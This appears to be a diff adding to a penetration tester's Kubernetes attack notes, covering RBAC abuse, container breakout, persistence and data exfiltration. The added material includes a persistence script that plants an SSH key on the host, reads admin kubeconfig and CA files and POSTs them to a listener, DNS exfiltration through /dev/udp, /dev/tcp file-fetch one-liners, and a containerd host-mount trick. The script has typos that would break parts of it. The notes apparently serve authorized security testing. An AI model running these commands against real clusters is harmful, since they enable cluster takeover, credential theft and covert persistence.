@@ -25,6 +25,12 @@ Dangerous RBAC Permissions
 			--severity-threshold 
 				set policy severity threshold
 
+	* includes Escalate verb (not just Create, Read, Update, Delete)
+		allows assigning permissions you should not have
+
+	LIST secrets
+	GET node
+
 	Manipulate AuthN/Z
 		impersonate
 		escalate
@@ -89,6 +95,16 @@ Look for Cluster CA key
 	see https://raesene.github.io/blog/2019/04/16/kubernetes-certificate-auth-golden-key/
 
 
+Communicating without curl or wget
+	https://mareksuppa.com/til/bash-dev-tcp-http-without-curl/
+
+	Instead of: curl http://service:8642/health
+
+	Use:
+		exec 3<>/dev/tcp/service/8642
+		printf 'GET /v1/models HTTP/1.1\r\nHost: service\r\nAuthorization: Bearer %s\r\nConnection: close\r\n\r\n' "$API_KEY" >&3
+		cat <&3
+
 Insecure Port
 	kubectl -s http://<node_IP>:8080 -n kube-system get pods
 	kubectl -s http://<node_IP>:8080 -n kube-system exec -it kube-apiserver-<cluster_name>-control-plane /bin/sh
@@ -139,6 +155,9 @@ Access to cluserrole-aggregation-controller secret
 		kubectl --token=$TOKEN -n kube-system exec kube-apiserver-sshgs-control-plane cat /etc/kubernetes/pki/ca.key
 
 
+Get secrets via pod creation
+
+
 
 Get secrets from etcd 
 	includes config for whole cluster, including all secrets
@@ -153,6 +172,7 @@ Get secrets from etcd
 Find secrets with access to etcd database (or backup)
 		strings db | grep -B 4 Opaque
 		strings db | grep -B 1 -A 1 "service-account-token"
+
 
 
 Cloud Metadata Services
@@ -461,6 +481,106 @@ If you are in a pod running with `hostNetwork: true`
 ready-to-use manifests for different permissions/resources/directions
 	https://github.com/BishopFox/badPods
 
+If you have shell access to a node, but the node OS is locked down (e.g. filesystems read-only, noexec).
+
+	ctr is always installed (IME) alongside containerd
+
+	create a containerd namespace (nothing to do with Kubernetes namespaces, or Linux namespaces)
+
+		ctr namespace create ncc_test
+
+	pull down a container image
+
+		ctr -n ncc_test images pull busybox:latest
+
+	start the container
+
+		ctr -n ncc_test run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro busybox:latest ncc_test
+
+	Shell in the container provides full access to the host's filesystem and network interfaces
+
+
+Persistence
+	Minted user certs
+	Direct etcd access
+	Craft SAT
+	Create custom RBAC
+	Create workloads
+	Static node manifests (in namespace not in Kubernetes)
+	Malicious admission controller/operator
+	Cronjobs on nodes
+	SSH keys on nodes
+	Modify container runtime
+	Implant on attached cloud storage
+
+persist.sh
+	#!/bin/bash
+	echo "Writing SSH key to root"
+	mkdir -p /host/root/.ssh
+	echo "<my_key>" >> /host/root/.ssh/authorized_keys
+	echo "Getting admin keys"
+	cat /host/etc/kubernetes/super-admin.conf
+	cat /host/tec/kubernetes/pki/ca.crt
+	echo "Sending to the mothership"
+	curl http://<listener_IP>:<listener_port> -XPOST -M "Content-TypeL application/json" -d "{\"process-listing\":\"$(ps -efww)\", \"keys\": \"$(cat /host/etc/kubernetes/super-admin.conf)\"}"
+	echo "Creating static manifest"
+	cp /noderootpod.yaml /host/etc/kubernetes/manifests/attacker.yaml
+	sleep infinity
+
+
+
+Data exfiltration bypassing HTTP network policies using DNS
+	While outbound HTTP(S) traffic is commonly inspected and filtered in Kubernetes environments, DNS traffic is often allowed to pass unrestricted, even from unprivileged pods. This creates a covert channel for attackers to exfiltrate data or establish command-and-control communication using DNS tunneling techniques, such as sending outbound DNS queries from within a Kubernetes pod by writing to `/dev/udp`, a BASH feature that enables UDP transmission directly from the shell. This allows encoded data to be embedded into DNS queries, effectively bypassing the egress controls in place.
+
+		1. Authenticate to one of the clusters in the location section.
+		2. Deploy a test pod with interactive shell access.
+
+		   ~~~bash
+		   kubectl -n default apply -f dns-bypass.yaml
+		   ~~~
+		   
+		   Contents of `dns-bypass.yaml`
+		   
+		   ~~~yaml
+		   apiVersion: v1
+		   kind: Pod
+		   metadata:
+		     name: dns-bypass-1
+		     labels:
+		       app: dns-bypass-1
+		   spec:
+		     containers:
+		     - image: ubuntu:latest
+		       command:
+		       - "sleep"
+		       - "3600"
+		       imagePullPolicy: IfNotPresent
+		       name: dns-bypass-1
+		       resources:
+		         limits:
+		           cpu: "500m"
+		           memory: "512Mi"
+		         requests:
+		           cpu: "250m"
+		           memory: "512Mi"
+		   ~~~
+
+		3. `kubectl exec` into the pod 
+
+		   ~~~bash
+		   kubectl exec -it dns-bypass-1 -- bash
+		   ~~~
+
+		4. Create a test-file and exfiltrate its content through BASH's /dev/udp feature
+
+		   ~~~bash
+		   echo "test_data" > /tmp/data.txt
+		   echo "" > /dev/udp/$(head -1 /tmp/data.txt).<collaborator_subdomain>.na.nccburp.com/
+		   ~~~
+
+		5. Confirm the DNS query is received in the external DNS logs
+
+
 
 Misc Container Breakouts
 	Linux Kernel Before v5.15
@@ -491,6 +611,11 @@ file copying
 	copy files out of a container
 		kubectl cp default/<pod_name>:/path/to/file/in/container /path/to/copy/destination
 	good for collecting evidence for reporting
+
+file copying from inside container
+	No nc/wget/curl - use BASH one-liner to transfer files
+		
+		bash -c "exec 3<>/dev/tcp/IP/80; echo -e 'GET /youfile.sh HTTP/1.1\r\nHost: ip\r\nConnection: close\r\n\r\n' >&3; cat <&3 > yourfile.sh"
 
 Run any Helm Chart using Tiller and gain node root access
 	helm --host tiller-deploy.kube-system.svc.cluster.local:44134 install /path/to/chart
@@ -538,3 +663,21 @@ Bypassing image vulnerability scanners
 	https://raesene.github.io/blog/2023/04/22/Fun-with-container-images-Bypassing-vulnerability-scanners/
 	
 	https://github.com/bgeesaman/malicious-compliance
+
+
+Ephemeral pods for debugging (kubectl debug)
+	may bypass admission controls
+	provide access to system files in pods that have no shell to exec
+
+Image Verification
+	Not much reason not to be able to sign with Sigstore Cosign
+	Cosign + Rekor + OAuth2 = signed and authentic image
+	Kyverno and other admission controllers can check image validity
+
+EKS Persistent Volumes
+	AWS posted a bulletin on April 17, 2026. Actors with PersistentVolume creation privileges can inject arbitrary mount options through unsanitized fields in the EFS CSI Driver. Impacted versions are v3.0.0 and earlier. AWS says the issue is fixed in v3.0.1 and recommends restricting PersistentVolume and StorageClass creation to cluster administrators via Kubernetes RBAC. 
+
+	“managed backend” does not mean “managed cluster edge”
+
+	Customer action: upgrade to v3.0.1 or later and tighten RBAC around PV / StorageClass creation
+
